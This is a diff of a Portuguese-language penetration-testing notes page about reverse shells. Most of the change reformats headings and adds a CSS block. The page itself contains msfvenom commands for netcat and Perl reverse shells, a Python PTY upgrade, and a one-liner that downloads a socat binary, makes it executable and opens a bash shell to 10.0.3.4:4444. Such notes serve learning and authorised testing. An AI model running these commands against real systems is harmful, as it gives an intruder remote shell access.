@@ -6,41 +6,38 @@ date: 2025-03-30T14:32:00r
 render_with_liquid: false
 ---
 
-# 🖥️ ** Programas com Shells comuns **
+# 🖥️ Programas com Shells comuns
 
 > 📌 **Descrição:**  
 > Quando pegamos uma Reverse Shell simples, nem todos os recursos ficam liberados e disponíveis. Isto faz com que os demais processos relacionados ao Pentest demorem mais. Alguns dos recursos limitados são:
-> - STDERR não é mostrado
+> - `STDERR` não é mostrado
 > - Não é possível usar VIM
 > - Comandos como `su` ou `ssh` não são acessíveis
 > - Sem controle sobre histórico, tab-complete, etc
 
----
+## 📂 Gerando uma Reverse Shell com msfvenom
 
-## 📂 **1. Gerando uma Reverse Shell com msfvenom
-
-#### 1.1. Gerando reverse com Netcat
+### Gerando reverse com Netcat
 
 ```bash
 msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.3.4 LPORT=4444 R
 ```
 
-#### 1.2. Gerando reverse com Perl
+### Gerando reverse com Perl
 
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=10.0.3.4 LPORT=4444 R
 ```
 
----
-# 🐚 2. Upgrading Shell
+## 🐚 Upgrading Shell
 
-#### 2.1. Upgrading Shell com Python
+### Upgrading Shell com Python
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-#### 2.2. Upgrading Shell com Socat
+### Upgrading Shell com Socat
 
 Na máquina Kali:
 
@@ -60,7 +57,7 @@ Se o `socat` não estiver instalado, podemos tentar executar o upgrade enquanto 
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
 
-#### 2.3. Upgrading Shell com Netcat/Magic
+### Upgrading Shell com Netcat/Magic
 
 Comaçamos chamando um PTY como no primeiro comando, mas deixamos ele em segundo plano usando o `CTRL+Z`
 
@@ -114,4 +111,13 @@ export TERM=xterm-256color
 stty rows <num> columns <cols>
 ```
 
----
+<style>
+.center img {        
+  display:block;
+  margin-left:auto;
+  margin-right:auto;
+}
+.wrap pre{
+    white-space: pre-wrap;
+}
+</style>
